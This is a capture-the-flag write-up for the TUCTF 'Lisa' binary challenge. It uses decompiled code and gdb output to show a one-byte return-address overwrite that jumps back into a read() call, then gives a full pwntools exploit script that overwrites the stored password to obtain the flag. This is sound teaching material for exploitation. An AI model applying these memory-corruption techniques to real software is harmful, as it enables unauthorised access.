# Lisa (PWN, 489)

### Task description

Difficulty: medium-ish
Ayo, Johhny's got your take from the job.
Go meet up with em' to claim your share.
Oh, and stop asking to see the Mona Lisa alright. It's embarrassing

https://tuctf.com/files/763181476bfb720d04c6c2253436fb03/lisa

### Solution

First of all, let's run this binary to understand what it does.

```
Here's your share: 0x57639160
What? The Mona Lisa!
Look, if you want somethin' from me, I'm gonna need somethin' from you alright...
Okayyyyyyyyyyyyyyyyy
Ugh! You kiss your mother with that mouth?
Huh????????
```

When running normally, it outputs the address of some share and then asks for the user input twice.
Now let's try to break it:

```
Here's your share: 0x57ded160
What? The Mona Lisa!
Look, if you want somethin' from me, I'm gonna need somethin' from you alright...
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ugh! You kiss your mother with that mouth?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Okay, it seems that we can cause a segmentation fault. But where can we go with it? To answer this question, let's look at the decompiled code:

```c
int lisa()
{
	// many lines of classical ascii-art
	system("/bin/cat ./flag");
	// many more lines of classical ascii-art
}

ssize_t fail(void *buf)
{
  puts("Ugh! You kiss your mother with that mouth?");
  return read(0, buf, 29u);
}

int checkPass()
{
  int result;
  char buf;

  if ( doStrcmp(inp, (char *)pass) )
    result = lisa();
  else
    result = fail(&buf);
  return result;
}

int main()
{
	char our_password; // [esp+0h] [ebp-34h]

	setvbuf(stdout, 0, 2, 20u);
	setvbuf(stdin, 0, 2, 20u);
	memset(&our_password, 0, 48u);
	pass = malloc(43u);
	printf("Here's your share: %p\n", pass);
	puts("What? The Mona Lisa!\nLook, if you want somethin' from me, I'm gonna need somethin' from you alright...");
	read(0, &our_password, 0x30u);
	inp = &our_password;
	pfd = open("./password", 0);
	read(pfd, pass, 43u);
	checkPass();
	return 0;
}

```

As we've seen from experiments and as we see now from the source code, the program flow is pretty linear: 

1. It fills memory dedicated to "our_password" variable with zeros and allocates space for the real password.
2. It outputs the address of real password.
3. It reads our password from stdin.
4. It reads the real password from "./password".
5. It compares both passwords and then:
5.1 If they are equal, it calls the lisa function.
5.2 Otherwise, it calls the fail function, which takes another user input and then goes up the stack to "return 0".

What draws our attention here is the function lisa: if we call lisa, we will get the flag. But to do so, we must know the correct password, mustn't we?
Well, it's hard to say when we look just at the source code. As we remember, we've succeeded to cause a segmentation fault. Let's do it again but this time with gdb.
Having been given long input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', the program goes from "fail" back to "checkPass" and then tries to return to main. This is when something interesting happens:

```
[----------------------------------registers-----------------------------------]
EAX: 0x1d 
EBX: 0x56559000 --> 0x3ef0 
ECX: 0xffffd314 ('a' <repeats 29 times>, "]UVfirst_input\n")
EDX: 0x1d 
ESI: 0xf7fa7000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0x61616161 ('aaaa')
ESP: 0xffffd330 ("a]UVfirst_input\n")
EIP: 0x56555801 (<checkPass+67>:	ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565557fc <checkPass+62>:	add    esp,0x4
   0x565557ff <checkPass+65>:	nop
   0x56555800 <checkPass+66>:	leave  
=> 0x56555801 <checkPass+67>:	ret    
   0x56555802 <lisa>:	push   ebp
   0x56555803 <lisa+1>:	mov    ebp,esp
   0x56555805 <lisa+3>:	push   ebx
   0x56555806 <lisa+4>:	call   0x56555630 <__x86.get_pc_thunk.bx>
[------------------------------------stack-------------------------------------]
0000| 0xffffd330 ("a]UVfirst_input\n")
0004| 0xffffd334 ("first_input\n")
0008| 0xffffd338 ("t_input\n")
0012| 0xffffd33c ("put\n")
0016| 0xffffd340 --> 0x0 
0020| 0xffffd344 --> 0x0 
0024| 0xffffd348 --> 0x0 
0028| 0xffffd34c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555801 in checkPass ()
gdb-peda$ x/xw 0xffffd330
0xffffd330:	0x56555d61
```

Next instruction to be executed is located at 0x56555d61 (example with randomization turned off). But if we check in disassembler, we will see that the instruction following "call checkPass" should be located at 0x56555d22.
If we remember that we are asked exactly 29 bytes in fail function, the reason for this result becomes clear on close examination of the stack layout:

```
Before writing many 'a's into buffer in fail():

0xffffd300:	0x0000001d	0x56559000	0xffffd32c	0x565557fc
     (start of buffer)->|--we can write here--------------
0xffffd310:	0xffffd314	0xffffd334	0xf7eb6bb0	0x56559000
            ---------------------and here-----------------
0xffffd320:	0xf7fa7000	0x56555d1a	0x00000003	0xffffd368
                    |- (<- this byte we also can overwrite)
0xffffd330:	0x56555d22	0x73726966	0x6e695f74	0x0a747570

After:

0xffffd300:	0x0000001d	0x56559000	0xffffd32c	0x565557fc
                        |--overwritten--------------------
0xffffd310:	0xffffd314	0x61616161	0x61616161	0x61616161
            ---------------overwritten--------------------
0xffffd320:	0x61616161	0x61616161	0x61616161	0x61616161
                    |- (<- last byte of return address)
0xffffd330:	0x56555d61	0x73726966	0x6e695f74	0x0a747570
```

We have overwritten one byte of return address to the main function (at 0xffffd330)! Let's look at what's located next:

```
gdb-peda$ x/s 0xffffd334
0xffffd334:	"first_input\n"
```

It means that our first input follows just the return address to "main", one byte of which we can overwrite with our second input. 
The problem here is that by overwriting return address we cannot go to the lisa function because its address ends with something like "xx|xx|x8|02" while we are restricted to the addresses matching "xx|xx|xD|XX". 
Okay, now where shall we return?

```
0x56555d01 <main+193>:	lea    eax,[ebx+0x40]
0x56555d07 <main+199>:	mov    edx,DWORD PTR [eax]
0x56555d09 <main+201>:	lea    eax,[ebx+0x48]
0x56555d0f <main+207>:	mov    eax,DWORD PTR [eax]
0x56555d11 <main+209>:	push   0x2b                     / number of bytes to read
0x56555d13 <main+211>:	push   edx                      / buffer to read into
0x56555d14 <main+212>:	push   eax                      / fd to read from
0x56555d15 <main+213>:	call   0x56555550 <read@plt>    / normally - reading the real password
0x56555d1a <main+218>:	add    esp,0xc
0x56555d1d <main+221>:	call   0x565557be <checkPass>
0x56555d22 <main+226>:	mov    eax,0x0                  / normally - location to which we return from checkPass
0x56555d27 <main+231>:	mov    ebx,DWORD PTR [ebp-0x4]
0x56555d2a <main+234>:	leave  
0x56555d2b <main+235>:	ret                             / maybe return here?
```

My first guess was to return to the "ret" instruction of main, which, being followed by the actual address of lisa, will get us the flag. It works okay without randomization, but with it - no, it doesn't work.
But if we return to the "call read" instruction, we can overwrite any memory (almost) with any bytes because we control the values following stored EIP at stack, which are going to be arguments for read().

```c
// from man pages for read()
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count);
// read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
```

If we use the given address of real password as a second parameter and stdin (fd = 0) as a first parameter, we can overwrite it and make it match our own first input, which is comprised of all the necessary parameters. It results in a successful comparison of both passwords and getting awarded with the flag.

```python
# solution in python

from pwn import *
import re
import struct
import time

r = process('lisa')
#r = remote('18.191.244.121', 12345)
data = r.recvuntil('...\n')
print data
share = int(re.findall(r'share: 0x(\w+)', data)[0],16)

first_input = struct.pack('<I',0) # stdin
first_input += struct.pack('<I',share) # address of real password
first_input += struct.pack('<I',0x2b) # size of input
r.sendline(first_input)

print r.recvuntil('mouth?\n')
# overflowing last byte of checkPass return address (to main)
second_input = '\x15' * 29
r.send(second_input)

# duplicating first input so that the two match
unintended_third_input = struct.pack('<I',0)
unintended_third_input += struct.pack('<I',share)
unintended_third_input += struct.pack('<I',0x2b)
r.sendline(unintended_third_input)

time.sleep(0.5)
print r.recv()
r.close()


```